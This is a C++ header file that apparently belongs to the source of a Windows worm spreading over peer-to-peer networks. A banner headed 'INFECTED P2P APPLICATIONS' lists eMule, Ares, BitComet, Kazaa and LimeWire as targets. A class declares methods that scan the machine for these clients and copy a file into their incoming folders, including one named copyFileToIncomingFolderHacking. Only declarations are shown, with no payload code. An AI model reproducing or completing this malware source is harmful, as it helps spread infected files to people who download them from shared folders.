#include <iostream>
#include <stdlib.h>
#include <direct.h>
#include "P2P.h"
#include "P2PEmule.h"
#include "P2PAres.h"
#include "P2PBitComet.h"
#include "P2PKazaa.h"
#include "P2PLimeWire.h"
#include "WINRegistry.h"
#include "FunctionsStrings.h"
#include "NetBios.h"
#include "FunctionsFiles.h"

#define NUMP2P 10

#pragma once

/* ############################################################# 
   ##                 INFECTED P2P APPLICATIONS               ##
   ##                                                         ##
   ##     [ + ] eMule - Extension eDonkey P2P App             ##
   ##     [ + ] Ares - Origin Gnutella                        ##
   ##     [ + ] BitComet - BitTorrent Protocol                ##
   ##     [ + ] Kazaa - FastTrack Protocol                    ##
   ##     [ + ] LimeWire - P2P Gnutella Client Network        ##
   ##                                                         ##
   ############################################################# */
   
class P2PList {
   private:
      static P2P ** P2PSoftwareList;
      static int numElems; 
      static unsigned int portSelected;
      static bool inicialized;
      
   public:
      static void inicialize();
      static bool scanP2PSoftwareLocalMachine(bool selectPort = false);
      static bool copyFileToIncomingFolderHacking(const char * strFilename);
      static bool copyFileToIncomingFolder(const char * strFilename);     
      static P2P ** getP2PSoftwareList();
      static bool isInicialized() { return inicialized; }
      static int getNumElems() { return numElems; }
      static unsigned int getPortSelected() { return portSelected; }
};
